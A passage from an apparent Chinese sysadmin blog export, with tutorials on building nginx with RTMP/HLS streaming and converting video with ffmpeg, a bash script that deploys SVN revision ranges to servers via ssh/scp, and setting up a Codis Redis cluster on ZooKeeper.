ngx_cache_purge.zip 3.4 下载nginx[root@VM-242 src]# wget http://nginx.org/download/nginx-1.8.0.tar.gz [root@VM-242 src]# tar xf nginx-1.8.0.tar.gz [root@VM-242 src]# cd nginx-1.8.0 [root@VM-242 nginx-1.8.0]# ./configure --user=daemon --group=daemon --prefix=/usr/local/nginx/ --add-module=../nginx-rtmp-module-master --add-module=../ngx_cache_purge-master --add-module=../nginx_mod_h264_streaming-2.2.7 --with-http_stub_status_module --with-http_ssl_module --with-http_sub_module --with-http_gzip_static_module --with-http_flv_module --with-pcre=../pcre-8.37 [root@VM-242 nginx-1.8.0]# make &amp;&amp; make install [root@VM-242 nginx-1.8.0]# cd .. 3.5 运行nginx[root@VM-242 src]# /urs/local/nginx/sbin/nginx 3.6 nginx添加到环境变量[root@VM-242 src]# vim /root/.bash_profile PATH=$PATH:$HOME/bin:/usr/local/nginx/sbin [root@VM-242 src]# source /root/.bash_profile 3.7 编辑配置文件[root@VM-242 src]# egrep -v '^$|^#|#' /usr/local/nginx/conf/nginx.conf user daemon daemon; worker_processes 1; events { worker_connections 1024; } rtmp { server { listen 1935; chunk_size 4000; application vod { play /mnt/media/vod; } application hls { hls on; hls_path /mnt/media/app; hls_fragment 10s; } } } http { include mime.types; default_type application/octet-stream; sendfile on; keepalive_timeout 65; limit_conn_zone $binary_remote_addr zone=addr:10m; server { listen 8080; server_name localhost; location / { root /mnt/soft/nginx-rtmp-module-master/test/rtmp-publisher; } location /stat { rtmp_stat all; rtmp_stat_stylesheet stat.xsl; } location /stat.xsl { root /mnt/soft/nginx-rtmp-module-master; } location /control { rtmp_control all; } } server { listen 80; server_name localhost; location / { root /mnt/wwwroot; index index.html; } location ~ \\.flv$ { root /mnt/media/vod; flv; limit_conn addr 20; limit_rate 200k; } location ~ \\.mp4$ { root /mnt/media/vod; mp4; limit_conn addr 20; limit_rate 200k; } location /hls { alias /mnt/media/app; } error_page 500 502 503 504 /50x.html; location = /50x.html { root html; } } } 重新加载配置文件 [root@VM-242 src]# nginx -t [root@VM-242 src]# nginx -s reload 3.8 测试#### 上传个mp4文件到/mnt/media/vod打开浏览器播放http://10.19.21.241/love.mp4/mnt/media/video -&gt; 存放原始视频/mnt/media/app -&gt; 存放转成m3u8的视频,供http访问(HLS)/mnt/media/vod -&gt; 存放转换后的flv和mp4视频,供http或rtmp访问 3.9 网上下载了个avi格式的视频，需要转换成mp4格式才能播放使用ffmpeg工具来转换 [root@VM-242 src]# cd /mnt/media/video[root@VM-242 video]# ffmpeg -i test.avi -f mp4 -acodec libfaac -vcodec libx264 -b 512k -ab 320k ../vod/test1.mp4ffmpeg version 2.0.1 Copyright (c) 2000-2013 the FFmpeg developers built on Sep 21 2015 14:01:20 with gcc 4.4.7 (GCC) 20120313 (Red Hat 4.4.7-16) configuration: –enable-gpl –enable-version3 –enable-shared –enable-nonfree –enable-postproc –enable-libfaac –enable-libmp3lame –enable-libopencore-amrnb –enable-libopencore-amrwb –enable-libtheora –enable-libvorbis –enable-libvpx –enable-libx264 –enable-libxvid libavutil 52. 38.100 / 52. 38.100 libavcodec 55. 18.102 / 55. 18.102 libavformat 55. 12.100 / 55. 12.100 libavdevice 55. 3.100 / 55. 3.100 libavfilter 3. 79.101 / 3. 79.101 libswscale 2. 3.100 / 2. 3.100 libswresample 0. 17.102 / 0. 17.102 libpostproc 52. 3.100 / 52. 3.100Input #0, avi, from ‘test.avi’: Metadata: encoder : MEncoder SVN-r33883(20110719-gcc4.5.2) Duration: 00:03:49.54, start: 0.000000, bitrate: 1676 kb/s Stream #0:0: Video: mpeg4 (Advanced Simple Profile) (XVID / 0x44495658), yuv420p, 640x360 [SAR 1:1 DAR 16:9], 24 tbr, 24 tbn, 24 tbc Stream #0:1: Audio: mp3 (U[0][0][0] / 0x0055), 44100 Hz, stereo, s16p, 224 kb/sPlease use -b:a or -b:v, -b is ambiguous[libx264 @ 0xb6bf00] using SAR=1/1[libx264 @ 0xb6bf00] using cpu capabilities: MMX2 SSE2Fast SSSE3 SSE4.2[libx264 @ 0xb6bf00] profile High, level 3.0[libx264 @ 0xb6bf00] 264 - core 146 - H.264/MPEG-4 AVC codec - Copyleft 2003-2015 - http://www.videolan.org/x264.html - options: cabac=1 ref=3 deblock=1:0:0 analyse=0x3:0x113 me=hex subme=7 psy=1 psy_rd=1.00:0.00 mixed_ref=1 me_range=16 chroma_me=1 trellis=1 8x8dct=1 cqm=0 deadzone=21,11 fast_pskip=1 chroma_qp_offset=-2 threads=3 lookahead_threads=1 sliced_threads=0 nr=0 decimate=1 interlaced=0 bluray_compat=0 constrained_intra=0 bframes=3 b_pyramid=2 b_adapt=1 b_bias=0 direct=1 weightb=1 open_gop=0 weightp=2 keyint=250 keyint_min=24 scenecut=40 intra_refresh=0 rc_lookahead=40 rc=abr mbtree=1 bitrate=512 ratetol=1.0 qcomp=0.60 qpmin=0 qpmax=69 qpstep=4 ip_ratio=1.40 aq=1:1.00Output #0, mp4, to ‘../vod/test1.mp4’: Metadata: encoder : Lavf55.12.100 Stream #0:0: Video: h264 (libx264) ([33][0][0][0] / 0x0021), yuv420p, 640x360 [SAR 1:1 DAR 16:9], q=-1–1, 512 kb/s, 12288 tbn, 24 tbc Stream #0:1: Audio: aac (libfaac) ([64][0][0][0] / 0x0040), 44100 Hz, stereo, s16, 320 kb/sStream mapping: Stream #0:0 -&gt; #0:0 (mpeg4 -&gt; libx264) Stream #0:1 -&gt; #0:1 (mp3 -&gt; libfaac)Press [q] to stop, [?] for helpframe= 5510 fps= 67 q=-1.0 Lsize= 18091kB time=00:03:49.59 bitrate= 645.5kbits/s dup=1 drop=0video:13693kB audio:4226kB subtitle:0 global headers:0kB muxing overhead 0.963257%[libx264 @ 0xb6bf00] frame I:30 Avg QP:20.08 size: 23465[libx264 @ 0xb6bf00] frame P:2541 Avg QP:24.65 size: 4498[libx264 @ 0xb6bf00] frame B:2939 Avg QP:31.54 size: 642[libx264 @ 0xb6bf00] consecutive B-frames: 10.5% 45.3% 29.5% 14.7%[libx264 @ 0xb6bf00] mb I I16..4: 16.0% 60.6% 23.4%[libx264 @ 0xb6bf00] mb P I16..4: 1.3% 5.0% 0.9% P16..4: 31.9% 12.6% 7.8% 0.0% 0.0% skip:40.5%[libx264 @ 0xb6bf00] mb B I16..4: 0.1% 0.3% 0.0% B16..8: 25.7% 2.2% 0.5% direct: 1.0% skip:70.2% L0:34.1% L1:54.8% BI:11.2%[libx264 @ 0xb6bf00] final ratefactor: 23.57[libx264 @ 0xb6bf00] 8x8 transform intra:68.0% inter:67.4%[libx264 @ 0xb6bf00] coded y,uvDC,uvAC intra: 55.4% 42.0% 7.5% inter: 10.8% 5.6% 0.3%[libx264 @ 0xb6bf00] i16 v,h,dc,p: 25% 44% 10% 21%[libx264 @ 0xb6bf00] i8 v,h,dc,ddl,ddr,vr,hd,vl,hu: 27% 26% 24% 3% 4% 5% 3% 4% 5%[libx264 @ 0xb6bf00] i4 v,h,dc,ddl,ddr,vr,hd,vl,hu: 25% 27% 12% 5% 7% 8% 6% 6% 5%[libx264 @ 0xb6bf00] i8c dc,h,v,p: 54% 24% 19% 3%[libx264 @ 0xb6bf00] Weighted P-Frames: Y:4.3% UV:1.7%[libx264 @ 0xb6bf00] ref P L0: 66.0% 16.3% 13.5% 4.1% 0.0%[libx264 @ 0xb6bf00] ref B L0: 86.7% 12.4% 0.9%[libx264 @ 0xb6bf00] ref B L1: 95.3% 4.7%[libx264 @ 0xb6bf00] kb/s:488.57 参数详解 -i 指定输入文件 -f 输出格式 -acodec 指定声音编码器 -vcodec 指定视频编码器 -b 指定视频流量 -ab 指定声音流量 FFmpeg可使用众多参数，参数内容会根据ffmpeg版本而有差异，使用前建议先参考参数及编解码器的叙述。此外，参数明细可用 ffmpeg -h 显示；编解码器名称等明细可用 ffmpeg -formats 显示。 下列为较常使用的参数。 主要参数 -i 设定输入档名。-f 设定输出格式。-y 若输出档案已存在时则覆盖档案。-fs 超过指定的档案大小时则结束转换。-ss 从指定时间开始转换。-title 设定标题。-timestamp 设定时间戳。-vsync 增减Frame使影音同步。 影像参数 -b 设定影像流量，默认为200Kbit/秒。（ 单位请参照下方注意事项 ）-r 设定FrameRate值，默认为25。-s 设定画面的宽与高。-aspect 设定画面的比例。-vn 不处理影像，于仅针对声音做处理时使用。 -vcodec 设定影像影像编解码器，未设定时则使用与输入档案相同之编解码器。 声音参数 -ab 设定每Channel （最近的SVN 版为所有Channel的总合）的流量。（ 单位 请参照下方注意事项 ）-ar 设定采样率。-ac 设定声音的Channel数。-acodec 设定声音编解码器，未设定时与影像相同，使用与输入档案相同之编解码器。-an 不处理声音，于仅针对影像做处理时使用。-vol 设定音量大小，256为标准音量。(要设定成两倍音量时则输入512，依此类推。) 注意事项 以-b及ab参数设定流量时，根据使用的ffmpeg版本，须注意单位会有kbits/sec与bits/sec的不同。（可用ffmpeg -h显示说明来确认单位。） 例如，单位为bits/sec的情况时，欲指定流量64kbps时需输入‘ -ab 64k ’；单位为kbits/sec的情况时则需输入‘ -ab 64 ’。 以-acodec及-vcodec所指定的编解码器名称，会根据使用的ffmpeg版本而有所不同。例如使用AAC编解码器时，会有输入aac 与 libfaac的情况。此外，编解码器有分为仅供解码时使用与仅供编码时使用，因此一定要利用ffmpeg -formats 确 认输入的编解码器是否能运作。 转换后视频播放 http://10.19.21.241/test1.mp4","tags":[{"name":"ffmpeg","slug":"ffmpeg","permalink":"http://yoursite.com/tags/ffmpeg/"},{"name":"mencoder","slug":"mencoder","permalink":"http://yoursite.com/tags/mencoder/"},{"name":"nginx","slug":"nginx","permalink":"http://yoursite.com/tags/nginx/"},{"name":"x.264","slug":"x-264","permalink":"http://yoursite.com/tags/x-264/"}]},{"title":"脚本发布代码第二版","date":"2015-09-17T18:16:48.000Z","path":"2015/09/17/the-second-edition-release-script-code/","text":"之前写的脚本发布代码，每次发布都会checkout所有的代码，数据太多。 今天这个脚本会比上次那个要好很多，只上传指定范围内的版本号。 脚本有很多注释，相信大家都能看懂。我大略写下流程。 流程： 1.先获取最新代码版本号。 2.输入指定版本号。 3.列出指定版本号之间的代码文件，并写入到文件中。 4.发布之前备份远程服务器代码。 5.最后上传代码。 下面我贴下脚本和执行后的结果，如果各位有啥问题，可以留言给我。 #!/bin/bash #Author: Charlie.cen #Email: cenhuqing@gmail.com #Date: 2015/09/17 Check if user is root[ $(id -u) != “0” ] &amp;&amp; echo “Error: You must be root to run this script” &amp;&amp; exit 1 export PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/binclear dat=date +%Y%m%d-%H%Mrelease_path=”/home/deploy/version”svn_workdir=”/app/server”Server_pre=”10.19.21.241”Server_online=”10.19.21.242 10.19.21.243” cd $svn_workdir &amp;&amp; last_version=$(svn update | grep -E “版本|version|Version|At revision” | sed ‘s/[^0-9]//g’)echo -e “\\t\\033[32m当前最新的版本号是:\\033[0m \\033[31m$last_version\\033[0m, \\033[32m请输入的数字不要超过此版本号!!!\\033[0m” #指定起始和结束版本号while :do read -p “请输入起始版本号:” start_version #read -p &quot;请输入结束版本号:&quot; end_version while : do if (( $start_version &amp;gt;= $last_version ));then echo -e &quot;\\t\\033[31m你输入的起始版本号超过限制，请重新输入\\033[0m&quot; read -p &quot;请输入起始版本号:&quot; start_version continue else read -p &quot;请输入结束版本号:&quot; end_version while : do if (( $end_version &amp;gt;= $last_version ));then echo -e &quot;\\t\\033[31m你输入的结束版本号超过限制，请重新输入\\033[0m&quot; read -p &quot;请输入结束版本号:&quot; end_version continue else while : do if (( $start_version &amp;gt;= $end_version ));then echo -e &quot;\\t\\033[31m你输入的起始版本号大于或等于结束版本号，请重新输入\\033[0m&quot; read -p &quot;请输入起始版本号:&quot; start_version read -p &quot;请输入结束版本号:&quot; end_version continue else if [[ $start_version =~ ^[0-9]+$ ]] &amp;amp;&amp;amp; [[ $end_version =~ ^[0-9]+$ ]];then echo -e &quot;\\t\\033[32m你的起始版本号为:$start_version,你的结束版本号为:$end_version\\033[0m&quot; break else echo -e &quot;\\t\\033[31m你输入的类型错误，请重新输入。例如：123 23 890\\033[0m&quot; fi fi break done fi break done fi break done break done #进入工作目录，指定版本范围的文件列表写入到文件中cd $svn_workdir &amp;&amp; svn log -r $start_version:$end_version -v |egrep ‘^ M|^ A’|sort |uniq -c |sort -nr|awk ‘{print $3}’ &gt; $release_path/$startversion\\$end_version.txtif [ $? -eq 0 ];then echo -e “\\t\\033[32m导出指定版本成功\\033[0m”else echo -e “\\t\\033[31m导出指定版本失败\\033[0m” exit 1fi #删除以txt为后缀的文件sed -i ‘/.txt/d’ $release_path/$startversion\\$end_version.txt #上传到服务器while :do echo “请选择要发布的到哪台服务器:” echo -e “\\t\\033[32m1\\033[0m. 预发布” echo -e “\\t\\033[32m2\\033[0m. 线上” read -p “请输入发布到服务器的编号:” Remote_server if [ $Remote_server != 1 -a $Remote_server != 2 ];then echo -e “\\033[31m 输入错误,只能输入数字: 1,2 \\033[0m” else if [ $Remote_server = 1 ];then echo -e “\\t\\033[32m正在备份$Server_pre数据。。。\\033[0m” ssh root@$Server_pre “cp -r $svn_workdir /app/bak/server-$dat” &amp;&amp; echo -e “\\t\\033[32m数据备份完成\\033[0m” || exit 1 echo echo -e “\\t\\033[32m正在同步数据到$Server_pre。。。\\033[0m” while read line;do scp -r $svn_workdir$line root@$Server_pre:$svn_workdir$line &gt; /dev/null || exit 2 done &lt; $release_path/$startversion\\$end_version.txt echo -e “\\t\\033[32m数据同步完成\\033[0m” break else for i in ${Server_online[@]};do echo -e “\\t\\033[32m正在备份$i数据。。。\\033[0m” ssh root@$i “cp -r $svn_workdir /app/bak/server-$dat” &amp;&amp; echo -e “\\t\\033[32m数据备份完成\\033[0m” || exit 3 echo echo -e “\\t\\033[32m正在同步数据到$i。。。\\033[0m” while read line;do scp -r $svn_workdir$line root@$i:$svn_workdir$line &gt; /dev/null || exit 4 done &lt; $release_path/$startversion\\$end_version.txt echo -e “\\t\\033[32m数据同步完成\\033[0m” echo done break fi fidone下面是执行后显示信息，都是中文，俺E文太烂，写出来大家估计也看不懂。 当前最新的版本号是: 2442, 请输入的数字不要超过此版本号!!!请输入起始版本号:24300 你输入的起始版本号超过限制，请重新输入请输入起始版本号:2430请输入结束版本号:2410 你输入的起始版本号大于或等于结束版本号，请重新输入请输入起始版本号:2440请输入结束版本号:2441 你的起始版本号为:2440,你的结束版本号为:2441 导出指定版本成功请选择要发布的到哪台服务器: 1. 预发布 2. 线上请输入发布到服务器的编号:2 正在备份10.19.21.242数据。。。 数据备份完成 正在同步数据到10.19.21.242。。。 数据同步完成 正在备份10.19.21.243数据。。。 数据备份完成 正在同步数据到10.19.21.243。。。 数据同步完成&lt;/pre&gt; 可以查看远程服务器里是否备份过文件 [root@VM-249 scripts]# ansible online -m shell -a “ls -l /app/bak/“10.19.21.243 | success | rc=0 &gt;&gt;total 4drwxr-xr-x 9 root root 4096 Sep 17 17:44 server-20150917-1745 10.19.21.242 | success | rc=0 &gt;&gt;total 4drwxr-xr-x 9 root root 4096 Sep 17 17:44 server-20150917-1745检查是否发布最新版本到远程服务器，可以打开刚列出的指定版本号文件(2440_2441.txt) [root@VM-249 scripts]# cat /home/deploy/version/2440_2441.txt/admin/apps/api/controllers/CommunityController.php/admin/apps/admin/controllers/SchoolController.php/admin/apps/api/controllers/CommunityController.php检查其中一个文件 [root@VM-249 scripts]# md5sum /app/server/admin/apps/api/controllers/CommunityController.phpa420fa01054605aba3122cda01d8da1f /app/server/admin/apps/api/controllers/CommunityController.php[root@VM-249 scripts]# ansible online -m shell -a “md5sum /app/server/admin/apps/api/controllers/CommunityController.php”10.19.21.243 | success | rc=0 &gt;&gt;a420fa01054605aba3122cda01d8da1f /app/server/admin/apps/api/controllers/CommunityController.php 10.19.21.242 | success | rc=0 &gt;&gt;a420fa01054605aba3122cda01d8da1f /app/server/admin/apps/api/controllers/CommunityController.php&nbsp;","tags":[{"name":"ansible","slug":"ansible","permalink":"http://yoursite.com/tags/ansible/"},{"name":"svn","slug":"svn","permalink":"http://yoursite.com/tags/svn/"},{"name":"svn update","slug":"svn-update","permalink":"http://yoursite.com/tags/svn-update/"}]},{"title":"codis集群搭建","date":"2015-09-15T17:40:24.000Z","path":"2015/09/15/codis-cluster-structures/","text":"Codis 是一个分布式 Redis 解决方案, 对于上层的应用来说, 连接到 Codis Proxy 和连接原生的 Redis Server 没有明显的区别 (不支持的命令列表), 上层应用可以像使用单机的 Redis 一样使用, Codis 底层会处理请求的转发, 不停机的数据迁移等工作, 所有后边的一切事情, 对于前面的客户端来说是透明的, 可以简单的认为后边连接的是一个内存无限大的 Redis 服务.Codis 由四部分组成: Codis Proxy (codis-proxy) Codis Manager (codis-config) Codis Redis (codis-server) ZooKeepercodis-proxy 是客户端连接的 Redis 代理服务, codis-proxy 本身实现了 Redis 协议, 表现得和一个原生的 Redis 没什么区别 (就像 Twemproxy), 对于一个业务来说, 可以部署多个 codis-proxy, codis-proxy 本身是无状态的.codis-config 是 Codis 的管理工具, 支持包括, 添加/删除 Redis 节点, 添加/删除 Proxy 节点, 发起数据迁移等操作. codis-config 本身还自带了一个 http server, 会启动一个 dashboard, 用户可以直接在浏览器上观察 Codis 集群的运行状态.codis-server 是 Codis 项目维护的一个 Redis 分支, 基于 2.8.21 开发, 加入了 slot 的支持和原子的数据迁移指令. Codis 上层的 codis-proxy 和 codis-config 只能和这个版本的 Redis 交互才能正常运行.Codis 依赖 ZooKeeper 来存放数据路由表和 codis-proxy 节点的元信息, codis-config 发起的命令都会通过 ZooKeeper 同步到各个存活的 codis-proxy.Codis 支持按照 Namespace 区分不同的产品, 拥有不同的 product name 的产品, 各项配置都不会冲突. 1.安装go环境Go语言是谷歌2009发布的第二款开源编程语言。Go语言专门针对多处理器系统应用程序的编程进行了优化，使用Go编译的程序可以媲美C或C++代码的速度，而且更加安全、支持并行进程。下载地址：https://storage.googleapis.com/golang/go1.5.1.linux-amd64.tar.gz[root@VM-241 ~]# tar xf go1.5.1.linux-amd64.tar.gz -C /usr/local/[root@VM-241 ~]# vim /etc/profileexport GOROOT=/usr/local/goexport GOPATH=/usr/local/codisexport PATH=$PATH:$GOROOT/bin[root@VM-241 ~]# source /etc/profile### 2.安装zookeeperZooKeeper是一个分布式的，开放源码的分布式应用程序协调服务，是Google的Chubby一个开源的实现，是Hadoop和Hbase的重要组件。它是一个为分布式应用提供一致性服务的软件，提供的功能包括：配置维护、名字服务、分布式同步、组服务等。zookeeper依赖java环境，所以还要先安装java[root@VM-241 ~]# yum install -y java-1.8.0-openjdkzookeeper下载地址：[root@VM-241 ~]# wget http://apache.stu.edu.tw/zookeeper/zookeeper-3.4.6/zookeeper-3.4.6.tar.gz[root@VM-241 ~]# tar xf zookeeper-3.4.6.tar.gz[root@VM-241 ~]# mv zookeeper-3.4.6 /usr/local/zookeeper[root@VM-241 ~]# chown root. /usr/local/zookeeper -R[root@VM-241 ~]# cp /usr/local/zookepper/conf/zoo_sample.cfg /usr/local/zookeeper/conf/zoo.cfg启动服务[root@VM-241 ~]# /usr/local/zookeeper/bin/zkServer.sh start[root@VM-241 ~]# netstat -lutnp |grep javatcp 0 0 0.0.0.0:2181 0.0.0.0: LISTEN 1126/javatcp 0 0 0.0.0.0:52774 0.0.0.0: LISTEN 1126/java### 3.安装codis建议只通过go get命令来下载codis，除非你非常熟悉go语言的目录引用形式从而不会导致代码放错地方。该命令会下载master分支的最新版，我们会确保master分支的稳定。[root@VM-241 ~]# go get -u -d github.com/wandoulabs/codis[root@VM-241 ~]# cd $GOPATH/src/github.com/wandoulabs/codis[root@VM-241 codis]# ./bootstrap.shHint: It’s a good idea to run ‘make test’ ;)make[2]: Leaving directory /usr/local/codis/src/github.com/wandoulabs/codis/extern/redis-2.8.21/src&#39; make[1]: Leaving directory/usr/local/codis/src/github.com/wandoulabs/codis/extern/redis-2.8.21’go test ./pkg/… ./cmd/… -raceok github.com/wandoulabs/codis/pkg/models 20.779sok github.com/wandoulabs/codis/pkg/proxy 10.525sok github.com/wandoulabs/codis/pkg/proxy/redis 10.255sok github.com/wandoulabs/codis/pkg/proxy/router 2.170s? github.com/wandoulabs/codis/pkg/utils [no test files]? github.com/wandoulabs/codis/pkg/utils/assert [no test files]? github.com/wandoulabs/codis/pkg/utils/atomic2 [no test files]ok github.com/wandoulabs/codis/pkg/utils/bytesize 0.016s? github.com/wandoulabs/codis/pkg/utils/errors [no test files]? github.com/wandoulabs/codis/pkg/utils/log [no test files]? github.com/wandoulabs/codis/pkg/utils/trace [no test files]? github.com/wandoulabs/codis/cmd/cconfig [no test files]? github.com/wandoulabs/codis/cmd/proxy [no test files]执行全部指令后，会在 bin 文件夹生成 codis-config, codis-proxy 两个可执行文件, (另外, bin/assets 文件夹是 codis-config 的 dashboard http 服务需要的前端资源, 需要和 codis-config 放置在同一文件夹下)### 4.部署配置文件,codis-config 和 codis-proxy 在不加 -c 参数的时候, 默认会读取当前目录下的 config.ini 文件[root@VM-241 codis]# egrep -v ‘^#|^$’ config.inicoordinator=zookeeperzk=127.0.0.1:2181product=testdashboard_addr=10.19.21.241:18087password=backend_ping_period=5session_max_timeout=1800session_max_bufsize=131072session_max_pipeline=1024zk_session_timeout=30proxy_id=proxy_1##### 4.1 启动dashboard[root@VM-241 codis]# bin/codis-config dashboard打开浏览器 4.2 初始化slots[root@VM-241 codis]# bin/codis-config slot init { \"msg\": \"OK\", \"ret\": 0 } 该命令会在zookeeper上创建slot相关信息 4.3 启动codis redis[root@VM-241 codis]# bin/codis-server --port 6379 &amp; [root@VM-241 codis]# bin/codis-server --port 6380 &amp; [root@VM-241 codis]# bin/codis-server --port 6479 &amp; [root@VM-241 codis]# bin/codis-server --port 6480 &amp; 4.4 添加redis server group每个server group作为一个reds服务器组存在，只允许有一个master，可以有多个slave，group id仅支持大于等于1的整数例如：添加两个server group，每个group有两个reds实例，group id分别为1和2，reds实例为一主一从。添加一个group， group的id为1，并添加一个reds master到该group[root@VM-241 codis]# bin/codis-config server add 1 localhost:6379 master{ “msg”: “OK”, “ret”: 0}添加一个redis slave到该group[root@VM-241 codis]# bin/codis-config server add 1 localhost:6380 slave{ “msg”: “OK”, “ret”: 0}类似再添加group，group的id为2[root@VM-241 codis]# bin/codis-config server add 2 localhost:6479 master{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config server add 2 localhost:6480 slave{ “msg”: “OK”, “ret”: 0}#### ### 5. 设置 server group 服务的 slot 范围Codis 采用 Pre-sharding 的技术来实现数据的分片, 默认分成 1024 个 slots (0-1023), 对于每个key来说, 通过以下公式确定所属的 Slot Id : SlotId = crc32(key) % 1024 每一个 slot 都会有一个且必须有一个特定的 server group id 来表示这个 slot 的数据由哪个 server group 来提供.例如：设置编号为[0, 511]的 slot 由 server group 1 提供服务, 编号 [512, 1023] 的 slot 由 server group 2 提供服务[root@VM-241 codis]# bin/codis-config slot range-set 0 511 1 online{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config slot range-set 512 1023 2 online{ “msg”: “OK”, “ret”: 0}### 6. 启动codis-proxy[root@VM-241 codis]# bin/codis-proxy -c config.ini -L proxy.log –cpu=2 –addr=0.0.0.0:19000 –http-addr=0.0.0.0:11000 &amp;[1] 27716[root@VM-241 codis]# _ / / () __ / _/ / \\ / / / / / _// / / // / / // / / / ( )_/ __/ _,/ /_/ /__/刚启动的 codis-proxy 默认是处于 offline状态的, 然后设置 proxy 为 online 状态, 只有处于 online 状态的 proxy 才会对外提供服务[root@VM-241 codis]# bin/codis-config -c config.ini proxy online proxy_1{ “msg”: “OK”, “ret”: 0}### 7.测试分片[root@VM-241 codis]# redis-cli -h 127.0.0.1 -p 19000redis 127.0.0.1:19000&gt; set a 1OKredis 127.0.0.1:19000&gt; set b 2OKredis 127.0.0.1:19000&gt; set c 3OK只有在group_2有数据。应该是数据量少脚本批量插入数据#!/bin/bashnumber=2000let i=0while [ $i -le $number ];do redis-cli -h 10.19.21.241 -p 19000 set name{$i} ${i} ((i++))done### 8.在线添加slave首先再启动两个server[root@VM-241 codis]# bin/codis-server –port 6381 &amp;[root@VM-241 codis]# bin/codis-server –port 6481 &amp;然后将两个server分别添加到group中&nbsp;#### ### 9. 移除节点##### 9.1 设置proxy为offline[root@VM-241 codis]# bin/codis-config proxy offline proxy_1{ “msg”: “OK”, “ret”: 0}[5] Exit 1 bin/codis-proxy -c config.ini -L proxy.log –cpu=2 –addr=0.0.0.0:19000 –http-addr=0.0.0.0:11000##### 9.2 重新初始化slot[root@VM-241 codis]# bin/codis-config slot init -f{ “msg”: “OK”, “ret”: 0}##### 9.3 移除节点[root@VM-241 codis]# bin/codis-config server remove-group 1{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config server remove-group 2{ “msg”: “OK”, “ret”: 0}[root@VM-241 codis]# bin/codis-config server remove-group 3{ “msg”: “OK”, “ret”: 0}查看页面###### ##############################################错误1：启动dashboard报错，提示已经存在pid文件[root@VM-241 codis]# bin/codis-config -c config.ini dashboard &amp;[1] 441[root@VM-241 codis]# 2015/09/15 10:23:05 dashboard.go:160: [INFO] dashboard listening on addr: :180872015/09/15 10:23:05 dashboard.go:234: [PANIC] create zk node failed[error]: dashboard already exists: {“addr”: “10.19.21.241:18087”, “pid”: 12687}[stack]: 3 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/dashboard.go:234 main.runDashboard 2 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/dashboard.go:54 main.cmdDashboard 1 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:84 main.runCommand 0 /usr/local/codis/src/github.com/wandoulabs/codis/cmd/cconfig/main.go:151 main.main … …[1]+ Exit 1 bin/codis-config -c config.ini dashboard解决办法：到zk里删除dashboard[root@VM-241 codis]# /usr/local/zookeeper/bin/zkCli.shConnecting to localhost:21812015-09-15 10:25:16,154 [myid:] - INFO [main:Environment@100] - Client environment:zookeeper.version=3.4.6-1569965, built on 02/20/2014 09:09 GMT2015-09-15 10:25:16,162 [myid:] - INFO [main:Environment@100] - Client environment:host.name=VM-2412015-09-15 10:25:16,162 [myid:] - INFO [main:Environment@100] - Client environment:java.version=1.8.0_512015-09-15 10:25:16,167 [myid:] - INFO [main:Environment@100] - Client environment:java.vendor=Oracle Corporation2015-09-15 10:25:16,168 [myid:] - INFO [main:Environment@100] - Client environment:java.home=/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.51-1.b16.el6_7.x86_64/jre2015-09-15 10:25:16,168 [myid:] - INFO [main:Environment@100] - Client environment:java.class.path=/usr/local/zookeeper/bin/../build/classes:/usr/local/zookeeper/bin/../build/lib/.jar:/usr/local/zookeeper/bin/../lib/slf4j-log4j12-1.6.1.jar:/usr/local/zookeeper/bin/../lib/slf4j-api-1.6.1.jar:/usr/local/zookeeper/bin/../lib/netty-3.7.0.Final.jar:/usr/local/zookeeper/bin/../lib/log4j-1.2.16.jar:/usr/local/zookeeper/bin/../lib/jline-0.9.94.jar:/usr/local/zookeeper/bin/../zookeeper-3.4.6.jar:/usr/local/zookeeper/bin/../src/java/lib/.jar:/usr/local/zookeeper/bin/../conf:2015-09-15 10:25:16,168 [myid:] - INFO [main:Environment@100] - Client environment:java.library.path=/usr/java/packages/lib/amd64:/usr/lib64:/lib64:/lib:/usr/lib2015-09-15 10:25:16,168 [myid:] - INFO [main:Environment@100] - Client environment:java.io.tmpdir=/tmp2015-09-15 10:25:16,169 [myid:] - INFO [main:Environment@100] - Client environment:java.compiler=&lt;NA&gt;2015-09-15 10:25:16,169 [myid:] - INFO [main:Environment@100] - Client environment:os.name=Linux2015-09-15 10:25:16,169 [myid:] - INFO [main:Environment@100] - Client environment:os.arch=amd642015-09-15 10:25:16,169 [myid:] - INFO [main:Environment@100] - Client environment:os.version=2.6.32-573.1.1.el6.x86_642015-09-15 10:25:16,170 [myid:] - INFO [main:Environment@100] - Client environment:user.name=root2015-09-15 10:25:16,170 [myid:] - INFO [main:Environment@100] - Client environment:user.home=/root2015-09-15 10:25:16,170 [myid:] - INFO [main:Environment@100] - Client environment:user.dir=/usr/local/codis/src/github.com/wandoulabs/codis2015-09-15 10:25:16,173 [myid:] - INFO [main:ZooKeeper@438] - Initiating client connection, connectString=localhost:2181 sessionTimeout=30000 watcher=org.apache.zookeeper.ZooKeeperMain$MyWatcher@7aec35aWelcome to ZooKeeper!2015-09-15 10:25:16,296 [myid:] - INFO [main-SendThread(VM-241:2181):ClientCnxn$SendThread@975] - Opening socket connection to server VM-241/127.0.0.1:2181. Will not attempt to authenticate using SASL (unknown error)JLine support is enabled2015-09-15 10:25:16,542 [myid:] - INFO [main-SendThread(VM-241:2181):ClientCnxn$SendThread@852] - Socket connection established to VM-241/127.0.0.1:2181, initiating session2015-09-15 10:25:16,583 [myid:] - INFO [main-SendThread(VM-241:2181):ClientCnxn$SendThread@1235] - Session establishment complete on server VM-241/127.0.0.1:2181, sessionid = 0x14fcb1992f9000a, negotiated timeout = 30000WATCHER::WatchedEvent state:SyncConnected type:None path:null[zk: localhost:2181(CONNECTED) 0] helpZooKeeper -server host:port cmd args stat path [watch] set path data [version] ls path [watch] delquota [-n|-b] path ls2 path [watch] setAcl path acl setquota -n|-b val path history redo cmdno printwatches on|off delete path [version] sync path listquota path rmr path get path [watch] create [-s] [-e] path data acl addauth scheme auth quit getAcl path close connect host:port[zk: localhost:2181(CONNECTED) 6] delete /zk/codis/db_test/dashboard[zk: localhost:2181(CONNECTED) 7] quitQuitting…2015-09-15 10:26:07,248 [myid:] - INFO [main-EventThread:ClientCnxn$EventThread@512] - EventThread shut down2015-09-15 10:26:07,249 [myid:] - 